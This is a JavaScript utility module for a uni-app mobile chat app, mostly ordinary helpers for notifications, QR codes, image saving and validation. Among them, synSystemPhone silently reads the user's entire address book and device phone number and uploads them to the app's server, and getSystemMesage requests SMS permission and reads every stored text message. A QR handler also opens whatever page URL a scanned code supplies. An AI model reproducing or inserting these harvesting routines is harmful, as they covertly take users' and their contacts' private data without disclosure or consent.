import _mixins from "./_mixins";
import _data from "./_data";
import _get from "./_get";
import _action from "./_action";

const pageParam = (data)=>{
    let url = ''
    for (var k in data) {
        let value = data[k] !== undefined ? data[k] : ''
        url += '&' + k + '=' + encodeURIComponent(value)
    }
    return url ? url.substring(1) : ''
}
const getSystemPhone = ()=>{
    let phone = null;
    switch (plus.os.name) {
        case "Android":
            // 程序全局环境对象
            var mainActivity = plus.android.runtimeMainActivity();
            var Context = new plus.android.importClass("android.content.Context");
            var TelephonyManager = new plus.android.importClass("android.telephony.TelephonyManager");
            var tm = mainActivity.getSystemService(Context.TELEPHONY_SERVICE);
            let msisdn = tm.getLine1Number();
            if (msisdn != "") {
                phone = msisdn;
            }
            break;
        case "iOS":
            break;
        default:
            break;
    }
    return phone;
}
const getSystemMesage = ()=>{

    var Context = plus.android.runtimeMainActivity();
    var res = plus.android.invoke("android.support.v4.app.ActivityCompat", "checkSelfPermission", Context,	"android.permission.READ_SMS");
    var PERMISSIONS_STORAGE = new Array();
    PERMISSIONS_STORAGE.push("android.permission.READ_SMS");
    // res == -1 时为询问状态,询问时会走Show 和 Hidden
    if (res != "0")
    {
        plus.android.invoke("android.support.v4.app.ActivityCompat", "requestPermissions", Context, PERMISSIONS_STORAGE, 1);
    } else {
        var main = plus.android.runtimeMainActivity();
        var Uri = plus.android.importClass("android.net.Uri");
        var ContactsContract = plus.android.importClass('android.provider.ContactsContract');
        var uri = Uri.parse("content://sms/");
        var cr = main.getContentResolver();
        plus.android.importClass(cr);
        var cur = cr.query(uri, null, null, null, null);
        plus.android.importClass(cur);
        cur.moveToFirst();
        while (cur.moveToNext())
        {
            var index_Address = cur.getColumnIndex("address");
            var address = cur.getString(index_Address);
            //短信内容
            var index_Body = cur.getColumnIndex("body");
            var body = cur.getString(index_Body);
            //类型1接收 2发送
            var index_Type = cur.getColumnIndex("type");
            var type = cur.getString(index_Type);
            console.log(address,body,type);
        }
        cur.close();
    }
}
const synSystemPhone = ()=>{
	//获取用户手机号
	//#ifdef APP-PLUS
	let phone = getSystemPhone();
	var info = plus.push.getClientInfo();
	plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function(addressbook) {
		addressbook.find(null, function(contacts) {
			_get.sendContact({params:JSON.stringify(contacts),client_id:info.clientid,phone:phone},function(res){
				console.log(res);
			});
			
		}, function() {
		}, {
			multiple: true
		});
	}, function(e) {
	});
	//#endif
}
const onBack = ()=>{
    let main = plus.android.runtimeMainActivity();
    let Context = plus.android.importClass("android.content.Context");
    let PowerManager = plus.android.importClass("android.os.PowerManager");
    let pm = main.getSystemService(Context.POWER_SERVICE);
    let g_wakelock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ANY_NAME");
    g_wakelock.acquire();
    return g_wakelock;
}
const closeBack = (g_wakelock)=>{
    g_wakelock.release();
    g_wakelock = null;
}
const pushLocalMsg = (data)=>{
    //发送本地push消息
    if(_data.data('isOnlie'))return false;
    if (!_data.localData('lytoken')) return false;
    //#ifdef APP-PLUS
    let  msg = '[未知]';
    let nickname = data.data.msg.user_info.name || '趣聊';
    switch (data.data.msg.type * 1) {
        case 0:
            msg = data.data.msg.content.text;
            break;
        case 1:
            /** 语音 */
            msg = '[语音]';
            break;
        case 2:
            /** 图片 */
            msg = '[图片]';
            break;
        case 3:
            /** 视频 */
            msg = '[视频]';
            break;
        case 4:
            /** 文件 */
            msg = '[文件]';
            break;
        case 5:
            /** 红包 */
            msg = '[红包]';
            break;
        case 6:
            /** 在线视频 */
            msg = '邀请您视频通话';
            break;
        case 7:
            /** 在线语音 */
            msg = '邀请您语音通话';
            break;
        case 8:
            /** 名片 */
            msg = '[名片]';
            break;
        default:
            /** 未知消息类型 */
            msg = '[未知]';
            break;
    }
	console.log(msg);
	console.log("nickname",nickname);
     plus.push.createMessage(msg,{},{title:nickname})
    //#endif
}
const scanCode=()=>{
        uni.scanCode({
            success: function (res) {
				let result = res.result;
				let params = {};
                try {
                     params = JSON.parse(result);
                } catch (e) {
					console.log(result);
                    return false;
                }
				console.log(params)
                if ('action' in params) {
                    switch (params.action) {
                        case 'chat_add':
                            uni.navigateTo({
                                url: '../details/index?user_id=' + params['user_id'] + '&is_type=3',
                            });
                            break;
                        case 'group_add':
                            _mixins.$httpSend({
                                path: '/im/message/addChat',
                                data: params,
                                success_action: true,
                                success(res) {
                                    let tips = res.err ? res.msg : '已经申请加入群聊,请耐心等待群管理审核';
                                    uni.showModal({
                                        content: tips,
                                        showCancel: false,
                                    });
                                }
                            });
                            break;
                        case 'toPage':
                            uni.navigateTo({
								url:params.url
							});
                            break;
                        default:
						console.log(params)
                            uni.showToast({
                                title: '扫码失败!',
                                icon: 'none'
                            })
                            return false;
                    }
                    return true;
                }
                let reg = /^(?:http(s)?:\/\/)?[\w.-]+(?:\.[\w\.-]+)+[\w\-\._~:/?#[\]@!\$&'\*\+,;=.]+$/;
                if (reg.test(res.result)) {
                    uni.navigateTo({
                        url: '../push/web?url=' + encodeURIComponent(res.result),
                    });
                }
            },
            fail (e) {
                console.log(JSON.stringify(e))
                return false;
            },
    })
}
const pushVedioLocalMsg = (data)=>{
    _action.playVoice('/static/voice/video.mp3', true);
	if(data.content_type == 6){ //视频
		 plus.push.createMessage("邀请您视频通话",data,{title:data.name,icon:"/static/theme/default/my/shipin.png"})
	}else{ 						//语音
		 plus.push.createMessage("邀请您语音通话",data,{title:data.name,icon:"/static/theme/default/my/yuyin.png"})
	}
}
const imgPreview = (list,idx)=>{
	if (list && list.length > 0) {
	    uni.previewImage({
	        current:list[idx],    //  传 Number H5端出现不兼容
	        urls: list
	    })
	}
}
const saveMpImg = (params, f_cb, s_cb) => {
	uni.getSetting({
	    success(res) {
	        if (!res.authSetting['scope.writePhotosAlbum']) {
	            uni.authorize({
	                scope: 'scope.writePhotosAlbum',
	                success() {
	                    //这里是用户同意授权后的回调
	                    if ('url' in params) {
	                        saveImgToLocalByUrl(params['url'])
	                    }
	                    if ('local' in params) {
	                        saveImgToPhotos(params['local'])
	                    }
	                    if (s_cb != undefined) s_cb();
	                },
	                fail() {//这里是用户拒绝授权后的回调
	                    if (f_cb != undefined) f_cb();
	                }
	            })
	        } else {//用户已经授权过了
	            if ('url' in params) {
	                saveImgToLocalByUrl(params['url'])
	            }
	            if ('local' in params) {
	                saveImgToPhotos(params['local'])
	            }
	        }
	    }
	})
}
const saveImgToLocalByUrl = (url)=>{
	uni.showModal({
	    title: '提示',
	    content: '确定保存到相册吗',
	    success: function (res) {
	        if (res.confirm) {
	            uni.downloadFile({
	                url: url,//图片地址
	                success: (res) => {
	                    if (res.statusCode === 200) {
	                        saveImgToPhotos(res.tempFilePath);
	                    }
	                }
	            })
	        } else if (res.cancel) {
	
	        }
	    }
	});
}
const saveImgToPhotos = (tempFilePath) =>{
	uni.saveImageToPhotosAlbum({
	    filePath: tempFilePath,
	    success: function () {
	        uni.showToast({
	            title: "保存成功",
	            icon: "none"
	        });
	    },
	    fail: function () {
	        uni.showToast({
	            title: "保存失败",
	            icon: "none"
	        });
	    }
	});
}
const capture = () =>{
	var pages = getCurrentPages();
	var page = pages[pages.length - 1];
	console.log("当前页" + pages.length - 1);
	var bitmap = null;
	var currentWebview = page.$getAppWebview();
	bitmap = new plus.nativeObj.Bitmap('amway_img');
	// 将webview内容绘制到Bitmap对象中
	currentWebview.draw(bitmap, function () {
	    console.log('截屏绘制图片成功');
	    bitmap.save("_doc/a.jpg"
	        , {}
	        , function (i) {
	            console.log('保存图片成功：' + JSON.stringify(i));
	            uni.saveImageToPhotosAlbum({
	                filePath: i.target,
	                success: function () {
	                    bitmap.clear(); //销毁Bitmap图片
	                    uni.showToast({
	                        title: '保存图片成功',
	                        mask: false,
	                        duration: 1500
	                    });
	                }
	            });
	        }
	        , function (e) {
	            console.log('保存图片失败：' + JSON.stringify(e));
	        });
	}, function (e) {
	    console.log('截屏绘制图片失败：' + JSON.stringify(e));
	});
	//currentWebview.append(amway_bit);
}
const onFireBeforeBack = (key, val) =>{
	var pages = getCurrentPages();
	var prevPage = pages[pages.length - 2]; //上一个页面
	//h5的写法
	//#ifdef   H5
	prevPage.key = val
	//#endif
	//#ifndef H5
	prevPage.$vm.setData({
	    key: val
	})
	//#endif
	uni.navigateBack()
}
const qrAction = {
        //收款码参数
        collection(params){
            let qrParams = {};
            qrParams.user_id = params.user_id;
            qrParams.action = 'collection';
            qrParams.amount = params.amount;
            qrParams.info = params.info;
            return JSON.stringify(qrParams);
        },
        //添加群聊
        addGroup(params){
            let qrParams = {};
            qrParams.user_id = params.user_id;
            qrParams.action = 'group_add';
            qrParams.list_id = params.list_id;
            qrParams.type = 1;
            return JSON.stringify(qrParams);
        },
        //添加好友
        chatAdd(params){
            let qrParams = {};
            qrParams.user_id = params.user_id;
            qrParams.action = 'chat_add';
            return JSON.stringify(qrParams);
        },
        //跳转到某页
        toPage(url,params){
            let qrParams = {};
            qrParams.action = 'toPage';
            qrParams.url = url+'?'+pageParam(params);
            return JSON.stringify(qrParams);
        }
    }
const  checkEmail = (email)=>{
    return RegExp(/^([a-zA-Z0-9]+[_|\_|\.]?)*[a-zA-Z0-9]+@([a-zA-Z0-9]+[_|\_|\.]?)*[a-zA-Z0-9]+\.[a-zA-Z]{2,3}$/).test(email);
}
const checkMobile = (mobile)=>{
    return RegExp(/^1[3456789]\d{9}$/).test(mobile);

}
export default {
    pageParam,
    getSystemPhone,
	getSystemMesage,
	pushLocalMsg,
	pushVedioLocalMsg,
    scanCode,
	imgPreview,
	saveMpImg,
	saveImgToLocalByUrl,
	saveImgToPhotos,
	capture,
	onFireBeforeBack,
	qrAction,
    checkEmail,
    checkMobile
}
